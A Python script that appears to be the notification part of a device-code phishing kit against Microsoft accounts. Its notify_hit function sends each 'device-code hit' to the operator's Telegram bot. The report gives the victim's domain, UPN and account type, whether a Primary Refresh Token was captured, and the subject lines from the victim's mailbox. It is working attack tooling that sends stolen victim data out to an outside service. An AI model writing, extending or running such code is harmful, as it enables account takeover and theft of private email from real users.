#!/usr/bin/env python3
"""Telegram notification. Never raises to the caller."""

import os
import time

import requests
from dotenv import load_dotenv

HERE = os.path.dirname(os.path.abspath(__file__))
load_dotenv(os.path.join(HERE, ".env"))

TG_TOKEN = os.environ.get("TG_TOKEN", "")
TG_CHAT = os.environ.get("TG_CHAT", "")


def esc(text):
    for ch in ("_", "*", "[", "]", "`"):
        text = text.replace(ch, "\\" + ch)
    return text


def resolve_chat():
    """Return TG_CHAT, or discover it from the most recent getUpdates message."""
    global TG_CHAT
    if TG_CHAT:
        return TG_CHAT
    try:
        r = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates", timeout=20)
        print(f"  HTTP {r.status_code} getUpdates")
        res = r.json().get("result") or []
        for upd in reversed(res):
            msg = upd.get("message") or upd.get("edited_message") or {}
            chat = (msg.get("chat") or {}).get("id")
            if chat:
                TG_CHAT = str(chat)
                return TG_CHAT
    except Exception as e:
        print(f"  telegram error: {str(e)[:120]}")
    return None


def notify_hit(domain, upn, prt_ok, subjects, consumer=False):
    if not TG_TOKEN:
        print("  notify: TG_TOKEN missing, skipping")
        return False
    if not resolve_chat():
        print("  notify: no TG_CHAT and no updates, skipping")
        return False
    chat = TG_CHAT
    lines = [
        "*New device-code hit*",
        f"domain: {esc(domain)}",
        f"UPN: {esc(upn)}",
        f"PRT: {'yes' if prt_ok else 'no'}",
    ]
    if consumer:
        lines.append("type: consumer (outlook.com/hotmail.com)")
    if subjects:
        lines.append("mailbox subjects:")
        for s in subjects[:5]:
            lines.append(f"- {esc(s)[:400]}")
    payload = {
        "chat_id": chat,
        "text": "\n".join(lines),
        "parse_mode": "Markdown",
        "disable_web_page_preview": True,
    }
    for attempt in range(3):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
                data=payload, timeout=20,
            )
            print(f"  telegram HTTP {r.status_code}")
            if r.status_code == 200 and r.json().get("ok"):
                return True
        except Exception as e:
            print(f"  telegram error: {str(e)[:120]}")
        time.sleep(2 ** attempt)
    return False


if __name__ == "__main__":
    import sys

    notify_hit(
        sys.argv[1] if len(sys.argv) > 1 else "example.com",
        sys.argv[2] if len(sys.argv) > 2 else "user@example.com",
        False, ["test subject"],
    )
